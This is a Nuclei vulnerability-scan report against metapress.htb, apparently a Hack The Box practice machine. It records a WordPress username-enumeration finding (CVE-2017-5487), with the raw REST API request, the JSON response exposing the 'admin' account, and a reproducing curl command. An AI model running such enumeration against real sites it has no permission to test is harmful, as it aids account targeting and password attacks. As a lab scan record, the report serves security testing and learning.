### WordPress Core < 4.7.1 - Username Enumeration (CVE-2017-5487:usernames) found on http://metapress.htb
---
**Details**: **CVE-2017-5487:usernames**  matched at http://metapress.htb

**Protocol**: HTTP

**Full URL**: http://metapress.htb/wp-json/wp/v2/users/

**Timestamp**: Sat Nov 12 12:36:09 +0000 GMT 2022

**Template Information**

| Key | Value |
|---|---|
| Name | WordPress Core < 4.7.1 - Username Enumeration |
| Authors | manas_harsh, daffainfo, geeknik, dr0pd34d |
| Tags | cve, cve2017, wordpress, wp, edb |
| Severity | medium |
| Description | WordPress Core < 4.7.1 is susceptible to user enumeration because it does not properly restrict listings of post authors via wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php in the REST API, which allows remote attackers to obtain sensitive information via a wp-json/wp/v2/users request. |
| CVSS-Metrics | [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) |
| CWE-ID | [CWE-200](https://cwe.mitre.org/data/definitions/200.html) |
| CVE-ID | [CVE-2017-5487](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2017-5487) |
| CVSS-Score | 5.30 |
| shodan-query | http.component:"WordPress" |
| verified | true |

**Request**
```http
GET /wp-json/wp/v2/users/ HTTP/1.1
Host: metapress.htb
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 200 OK
Connection: close
Transfer-Encoding: chunked
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Allow: GET
Cache-Control: no-store, no-cache, must-revalidate
Content-Type: application/json; charset=UTF-8
Date: Sat, 12 Nov 2022 12:36:08 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Link: <http://metapress.htb/wp-json/>; rel="https://api.w.org/"
Pragma: no-cache
Server: nginx/1.18.0
Set-Cookie: PHPSESSID=4iiodibd36tp5bvirgi967g6cb; path=/
Vary: Origin
X-Content-Type-Options: nosniff
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Wp-Total: 1
X-Wp-Totalpages: 1

[{"id":1,"name":"admin","url":"http:\/\/metapress.htb","description":"","link":"http:\/\/metapress.htb\/author\/admin\/","slug":"admin","avatar_urls":{"24":"http:\/\/2.gravatar.com\/avatar\/816499be5007457d126357a63115cd9c?s=24&d=mm&r=g","48":"http:\/\/2.gravatar.com\/avatar\/816499be5007457d126357a63115cd9c?s=48&d=mm&r=g","96":"http:\/\/2.gravatar.com\/avatar\/816499be5007457d126357a63115cd9c?s=96&d=mm&r=g"},"meta":[],"_links":{"self":[{"href":"http:\/\/metapress.htb\/wp-json\/wp\/v2\/users\/1"}],"collection":[{"href":"http:\/\/metapress.htb\/wp-json\/wp\/v2\/users"}]}}]
```

**Extra Information**

**Extracted results**:

- admin


References: 
- https://www.exploit-db.com/exploits/41497
- https://nvd.nist.gov/vuln/detail/cve-2017-5487
- https://www.wordfence.com/blog/2016/12/wordfence-blocks-username-harvesting-via-new-rest-api-wp-4-7/
- https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/

**CURL Command**
```
curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36' 'http://metapress.htb/wp-json/wp/v2/users/'
```
---
Generated by [Nuclei 2.7.8](https://github.com/projectdiscovery/nuclei)